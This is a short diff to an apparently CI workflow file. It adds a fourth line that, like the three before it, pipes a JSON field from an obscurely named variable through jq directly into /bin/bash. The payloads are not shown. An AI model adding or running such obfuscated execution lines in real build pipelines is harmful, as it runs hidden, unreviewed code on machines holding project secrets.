@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$cu8" | jq -r .u13 | /bin/bash
           echo $ctiw8573 | jq -r .jcv587 | /bin/bash
           echo $lz439 | jq -r .eu77799 | /bin/bash
+          printf '%s' "$scal294" | jq -r .un56991 | /bin/bash
 
       - name: Upload results
         if: always()
